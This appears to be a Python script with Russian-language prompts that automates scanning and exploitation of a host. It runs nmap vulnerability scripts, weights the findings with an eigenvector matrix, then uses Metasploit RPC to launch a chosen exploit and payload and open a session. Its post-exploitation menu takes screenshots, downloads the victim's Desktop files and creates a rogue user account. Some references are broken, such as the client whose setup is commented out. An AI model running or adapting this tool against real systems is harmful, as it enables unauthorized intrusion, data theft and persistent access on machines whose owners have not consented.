import numpy as np
import re
import os
import time
import nmap
from pymetasploit3.msfrpc import MsfRpcClient
from tabulate import tabulate
from db import *


def review(name, lvl=0, output=''):
    if lvl < 0.3:
        lvl = 'Слабый'
    elif lvl > 0.3 and lvl < 0.6:
        lvl = 'Средний'
    else:
        lvl = 'Высокий'
    if name in danger_vulns:
        print(tabulate([
            ['Название: ', name],
            ['Подробности: ',
             'ОБНАРУЖЕНО' + vulns_info[name][0]],
            ['Уровень опасности: ', lvl],
            ['Рекомендации: ', vulns_info[name][1]]
        ], ['Уязвимости'], tablefmt="fancy_grid"))
    else:
        print(tabulate([
            ['Название', name],
            ['Подробности', 'НЕ ОБНАРУЖЕНО\n' + output],
            []
        ]))


def port_scan(ip_add_entered):
    lines_for_tab = []
    nm = nmap.PortScanner()
    while True:
        try:
            port_range = input(
                " > Введите интервал портов или all для сканирования только открытых портов: ")
            if port_range == 'all':
                print_log('Сканирование портов ...')
                nm.scan(hosts=ip_add_entered,
                        arguments='-sV -Pn --script vuln')
                break
            else:
                print_log('Сканирование портов ...')
                nm.scan(hosts=ip_add_entered, ports=port_range,
                        arguments='-sV -Pn --script vuln')
                break
        except Exception as e:
            print(e)

    # Сканирование портов
    print_log('----------------------------------------------------')
    print_log('Host : %s (%s)' %
              (ip_add_entered, nm[ip_add_entered].hostname()))
    print_log('State : %s' % nm[ip_add_entered].state())
    print_log('----------------------------------------------------')
    ports = nm[ip_add_entered]['tcp'].keys()
    for port in ports:
        try:
            state = nm[ip_add_entered]['tcp'][port]['state']
            service = nm[ip_add_entered]['tcp'][port]['name']
            version = nm[ip_add_entered]['tcp'][port]['product']
            line = [port, state, service, version]
            lines_for_tab.append(line)
        except:
            print_log(f"Невозможно просканировать порт {port}.")
    print(tabulate(lines_for_tab, headers=[
        'Port', 'State', 'Service', 'Version'], tablefmt="fancy_grid"))

    return nm


def matrix(n, m):
    # Создаем матрицу
    M = np.ones([n, n])
    for i in range(0, n):
        for j in range(0, n):
            if i < j:
                mij = m[i]
                M[i, j] = float(mij)
                # Добавление обратных элементов (под главной диагональю)
                M[j, i] = 1 / float(mij)

    '''
    Чтобы вывести весовые коэффициенты, необходимо вычислить собственный вектор матрицы М.
    Для этого воспользуемся функцией numpy.linalg.eig(М)[1][:,0]
    '''
    vector = np.linalg.eig(M)[1][:, 0]
    # пронормируем вектор
    norm_vector = vector / vector.sum()
    return norm_vector


def set_matrix(danger_vulns):
    if len(danger_vulns) == 1:
        return 0
    else:
        print('found 2')
        arr = []
        keys = [k for k, v in id_type.items() if set(danger_vulns) & set(v)]
        check_row = keys.pop()
        # Значения, которые нужно взять из каждого ряда. Регулярное выражение
        check_col = [x - 2 for x in keys]

        for criteria in criterias:
            for x in range(0, len(criteria)):
                if x in check_row:
                    check_col = [m - x for m in check_col]
                    for y in range(0, len(criteria[x])):
                        if y in check_col:
                            arr.append(criteria[x][y])
        
        norm_vector = matrix(len(arr), arr)
        return norm_vector


def count_global_vectors():
    result_value = 0
    result = []
    if len(global_vectors) == 1:
        result = sum(criteria_vectors.values())
        return result
    else:
        for global_vector in global_vectors:
            for vector in global_vector:
                for criteria_vector in criteria_vectors.values():
                    result_value += criteria_vector * vector
            result.append(result_value)
    
    max_value = max(result)
    for v in result:
        if v == max_value:
            return (v, result.index(v))
        

def vuln_scan(ip_add_entered, nm):
    # Анализ уязвимостейs
    print('\n\n')

    scripts = nm[ip_add_entered]['hostscript']
    for script in scripts:
        try:
            scr_id = script['id']
            scr_out = script['output']
            vulnarabilities.append(scr_id)
            if 'VULNERABLE' in scr_out:
                danger_vulns.append(scr_id)
            else:
                review(scr_id, 0, scr_out)
        except:
            print('Error')
    
    if len(danger_vulns) > 0:
        global_vectors.append(set_matrix(danger_vulns))
        result = count_global_vectors()
    
    for vuln in danger_vulns:
        review(vuln, result)
    


def print_log(string, prnt=True):
    if prnt:
        print(string)
        with open('log.txt', 'a') as f:
            f.write(string + ' \n')


def meter_shell(cmd, shell):
    try:
        result = shell.run_with_output(cmd, end_strs=None)
        if 'command_not_found' in result:
            print_log('command not found')
        else:
            print_log(result)
    except Exception as e:
        print_log(e)


def find_exploit(client):
    # Эксплуатация уязвимости
    print_log("---------------------------------------------------")
    while True:
        exploit_entered = input(" > Уточните уязвимость:")
        if exploit_entered == 'ex':
            return 0
        exploit_entered = exploit_entered.replace('-', '_')

        exploits = client.modules.exploits
        for exploit in exploits:
            if exploit_entered in exploit:
                print_log(exploit)
        break


def choose_exploit(client):
    print_log("---------------------------------------------------")
    exploit_entered = input(" > Выберете эксплойт: ")
    if exploit_entered == 'ex':
        return 0
    exploit = client.modules.use('exploit', exploit_entered)
    exploit.target = 0
    exploit['RHOSTS'] = ip_add_entered
    print_log('Exploit: ' + exploit_entered)
    return exploit


def choose_payload(client, exploit):
    payloads = exploit.targetpayloads()
    for payload in payloads:
        print_log(payload)

    while True:
        payload_entered = input(" > Выберете пейлод: ")
        if payload_entered == 'ex':
            return 0
        pl = client.modules.use('payload', payload_entered)
        exploit.execute(payload=pl)
        print_log('Payload: ' + payload_entered)
        time.sleep(5)
        shell = run_exploit(exploit, pl)
        return shell


def run_exploit(exploit, pl):
    print_log("---------------------------------------------------")
    cid = client.consoles.console().cid
    while True:
        result = client.consoles.console(
            cid).run_module_with_output(exploit, payload=pl)
        print_log('Экплуатация уязвимости ...')
        print_log(result)

    # Постэксплуатационный период
        try:
            session_id = list(client.sessions.list.keys())[-1]
            print(session_id)
            shell = client.sessions.session(session_id)
        except:
            continue
        return shell


if __name__ == "__main__":
    # Инициализация данных
    ip_add_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
    port_min = 0
    port_max = 65535
    open_ports = []
    vulnarabilities = []
    danger_vulns = []
    global_vectors = []

    # # Инициализация клиента
    # try:
    #     client = MsfRpcClient("root")
    # except:
    #     print_log('Подключение...')
    #     os.system("msfrpcd -P root -S")
    #     time.sleep(10)
    #     client = MsfRpcClient("root")

    while True:
        ip_add_entered = input("\n > Введите ip адрес: ")
        if ip_add_pattern.search(ip_add_entered):
            print_log(f"{ip_add_entered} подходящий адрес")
        else:
            continue
        break

    nm = port_scan(ip_add_entered)
    while True:
        vuln_scan(ip_add_entered, nm)
        while True:
            check = find_exploit(client)
            if check == 0:
                break
            while True:
                exploit = choose_exploit(client)
                if exploit == 0:
                    break
                while True:
                    shell = choose_payload(client, exploit)
                    if shell == 0:
                        break
                    print('Примеры:')
                    print('Сделать скриншот - 1')
                    print('Скачать файлы - 2')
                    print('Создать пользователя - 3')
                    while True:
                        post_cmd = input(' > ')
                        if post_cmd == '1':
                            meter_shell('screenshot', shell)
                            continue
                        elif post_cmd == '2':
                            command = 'download C:\\Users\\user\\Desktop'
                            meter_shell(command, shell)
                            continue
                        elif post_cmd == '3':
                            command = 'run getgui -u BadUser -p 12345'
                            meter_shell(command, shell)
                            continue
                        elif post_cmd == 'ex':
                            break
                        meter_shell(post_cmd, shell)
